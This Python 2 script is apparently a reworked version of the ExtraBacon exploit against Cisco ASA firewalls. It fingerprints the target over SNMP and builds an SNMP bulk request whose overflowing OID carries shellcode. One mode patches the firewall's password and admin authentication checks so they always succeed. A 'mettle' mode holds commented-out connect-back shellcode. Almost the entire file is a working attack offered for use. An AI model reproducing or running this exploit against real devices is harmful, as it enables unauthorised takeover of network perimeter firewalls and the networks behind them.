#!/usr/bin/env python2

"""
Our goal with version 2.0 of ExtraBacon is to support more ASA versions, as well
as simplify the Python and payload shellcode. This means stripping as much as
possible from the shellcode and Python to still be functional.
"""

import sys
import string
import subprocess
import binascii
import random
import datetime

improved_dir = "./improved"

sys.path.insert(0, '..')
from Mexeggs.all import *
from Mexeggs import *
from scapy.all import *


##
##
##
class ExtrabaconInfoSubcommand(sploit.InfoSubcommand):
    expect_filename_argument = False    ##


    def setup_parser(self, parser):
        super(ExtrabaconInfoSubcommand, self).setup_parser(parser)

        self.parser = parser

        ##
        for a in self.parser._actions:
            if a.dest == "version":
                a.choices = ['v2c']
                a.help = 'SNMP version (v2c only)'

    def run(self, exp):
        super(ExtrabaconInfoSubcommand, self).run(exp)

##
##
##
##
class ExtrabaconExecSubcommand(sploit.ExecSubcommand):
    expect_filename_argument = False    ##


    def setup_parser(self, parser):
        super(ExtrabaconExecSubcommand, self).setup_parser(parser)

        self.parser = parser

        ##
        for a in self.parser._actions:
            if a.dest == "version":
                a.choices = ['v2c']
                a.help = 'SNMP version (v2c only)'

        self.parser.add_argument('--mode',
                                 help='select mode of operation',
                                 choices=["pass-disable", "pass-enable", "mettle"],
                                 required=True,
                                 default=None)
        self.parser.add_argument('--msg',
                                 help='print success message on console of target (DO NOT USE)',
                                 dest='msg',
                                 action='store_true',
                                 required=False,
                                 default=False)

    def run(self, exp):
        super(ExtrabaconExecSubcommand, self).run(exp)


class Extrabacon(Sploit):

    def setup_parser(self):
        super(Extrabacon, self).setup_parser()

        ##
        self.add_subcommand(ExtrabaconInfoSubcommand())
        ##
        self.add_subcommand(ExtrabaconExecSubcommand())
        ##

    ##
    def generate_touch(self):
        return SNMP(version   = self.params.version,
                    community = self.params.community,
                    PDU       = SNMPget(varbindlist = [SNMPvarbind(oid = ASN1_OID('1.3.6.1.2.1.1.1.0')),
                                                       SNMPvarbind(oid = ASN1_OID('1.3.6.1.2.1.1.3.0')),
                                                       SNMPvarbind(oid = ASN1_OID('1.3.6.1.2.1.1.5.0'))]))

    def fw_version_check(self, vers_string):
        # let's try a more generic approach
        version = vers_string.split("Version ")[1]
        version = version.replace(".", "_")

        # well this is crappy
        fname = improved_dir + '/shellcode_' + version + '.py'
        if not os.path.isfile(fname):
            return "unsupported"

        return version

    def post_touch(self, response):
        ##

        ##
        values = [x[SNMPvarbind].value.val for x in SNMP(response)[SNMP][SNMPresponse].varbindlist]
        if not values:
            return False

        ##
        snmp = SNMP(response)
        print "[+] response:"
        snmp.show()

        fw_uptime = values[1]
        fw_uptime_str = str(datetime.timedelta(seconds=fw_uptime/100))
        print
        print "[+] firewall uptime is %d time ticks, or %s" % (fw_uptime, fw_uptime_str)
        print

        fw_name = values[2]
        print "[+] firewall name is %s" % fw_name
        print

        fw_vers = self.fw_version_check(values[0])
        if fw_vers != "unsupported":
            print "[+] target is running %s, which is supported" % fw_vers
        else:
            print "[-] target is running %s, which is NOT supported" % values[0]

        self.key_data = fw_vers   ##

        if self.params.verbose:
            print 'Data stored in key file  : %s' % self.key_data

        ##
        ##

        return True

    def load_vinfo(self):
        self.vinfo = self.key_data.upper()
        if self.params.verbose:
            print 'Data stored in self.vinfo: %s' % self.vinfo

    def report_key(self, key):
        print "\nTo check the key file to see if it really contains what we're claiming:"
        print "# cat %s" % self.get_key_file(key = key)
        if self.key_data.lower() == "unsupported":
            return
        print "\nTo disable password checking on target:"
        print "# %s exec -k %s %s --mode pass-disable" %  (self.env.progname, key, " ".join(self.params.args[2:]))
        print "\nTo enable password checking on target:"
        print "# %s exec -k %s %s --mode pass-enable" %  (self.env.progname, key, " ".join(self.params.args[2:]))
        ##
        ##
        ##
        print

    def generate_exploit(self):

        if not self.params.mode:
            print "[-] no mode selected!"
            sys.exit(1)

        print "[+] generating exploit for exec mode %s" % self.params.mode

        if self.key_data.lower() == "unsupported":
            print "[-] unsupported target version, abort"
            sys.exit(1)

        if os.path.exists(improved_dir):
            print "[+] using shellcode in %s" % improved_dir
            sys.path.insert(0, improved_dir)
        else:
            print "[-] cannot find %s" % (improved_dir)
            sys.exit(1)

        self.sc_filename = "shellcode_%s" % self.key_data.lower()
        print "[+] importing version-specific shellcode %s" % self.sc_filename
        try:
            sc = __import__(self.sc_filename)
        except:
            print "[-] problem importing version-specific shellcode from %s" % self.sc_filename
            sys.exit(1)
        ##

        # cufwUrlfServerStatus + .9
        head = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
        head_len = len(head.split('.'))

        # do we patch, or restore original code
        if self.params.mode == 'pass-disable':
            always_true_code =  "49.192.64.195"
            pmcheck_bytes =  always_true_code
            admauth_bytes =  always_true_code
        else:
            pmcheck_bytes = sc.pmcheck_code
            admauth_bytes = sc.admauth_code

        preamble_snmp = ""
        preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
        preamble_snmp += sc.pmcheck_bounds
        preamble_snmp += ".205.128.88.187."
        preamble_snmp += sc.admauth_bounds
        preamble_snmp += ".205.128.199.5."
        preamble_snmp += sc.pmcheck_offset
        preamble_snmp += "."
        preamble_snmp += pmcheck_bytes
        preamble_snmp += ".199.5."
        preamble_snmp += sc.admauth_offset
        preamble_snmp += "."
        preamble_snmp += admauth_bytes
        preamble_snmp += ".97.104."
        preamble_snmp += sc.saferet_offset
        preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
        preamble_snmp += sc.fix_ebp
        preamble_snmp += ".204.195"

        if self.params.mode == 'mettle':

            preamble_snmp = "49.219.49.246.49.201.49.192.96.49.210."

            buf =  ""
            #buf += "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd"
            #buf += "\x80\x97\x5b\x68\x0a\x1e\x0a\x89\x66\x68\x11\x5c\x66"
            #buf += "\x53\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd"
            #buf += "\x80\x5b\x99\xb6\x0c\xb0\x03\xcd\x80"#\xff\xe1"


            for c in buf:
                preamble_snmp += "%d." % int(binascii.hexlify(c), 16)

            preamble_snmp += "97.104."
            preamble_snmp += sc.saferet_offset
            preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197.72.195"




        wrapper = preamble_snmp
        wrapper_len = len(wrapper.split('.'))
        wrapper += ".144" * (82 - wrapper_len)
        ##

        launcher = "139.124.36.20.139.7.255.224.144"

        overflow = string.join([head, "95", wrapper, sc.jmp_esp_offset, launcher], ".")

        ## removed superfluous length checks
        if len(overflow.split('.')) != 112:
            print "[-] problem with overflow_len (%d != 112)" % overflow_len
            sys.exit(1)

        self.params.request_id = random.randint(0x80000, 0x1fffffff)
        print "[+] random SNMP request-id %d" % self.params.request_id

        # we don't need to fix the launcher offset, only build 1 packet
        # also, we can remove the payload varbind
        exba_msg = SNMP(version=self.params.version,
                        community=self.params.community,
                        PDU=SNMPbulk(id=ASN1_INTEGER(self.params.request_id),
                                     max_repetitions=1,
                                     varbindlist=[SNMPvarbind(oid=ASN1_OID(overflow))]
                                     )
                        )


        if self.params.verbose:
            print "overflow (112): %s" % overflow
            print "EXBA msg (%d): %s" % (len(exba_msg), binascii.hexlify(exba_msg[SNMP].__str__()))

        ##
        if len(exba_msg) >= 512:
            print "[-] final SNMP msg is too large (%d >= %d) abort" % (len(exba_msg), 512)
            sys.exit(1)

        ##
        ##
        ##
        ret_list = [exba_msg]
        return(ret_list)

    def post_exploit(self, response):
        ##
        ##

        snmp = SNMP(response)
        print "[+] response:"
        snmp.show()

        recv_id = int(snmp.PDU.id.val)
        if recv_id == self.params.request_id:
            print "[+] received SNMP id %d, matches random id sent, likely success" % recv_id
            return True
        else:
            print "[-] received SNMP id %d, expecting %d, mismatch! This is probably bad" % (recv_id, self.params.request_id)
            return False


if __name__ == '__main__':
    exp = Extrabacon('Extrabacon', '1.1.0.1')
    exp.launch(sys.argv)
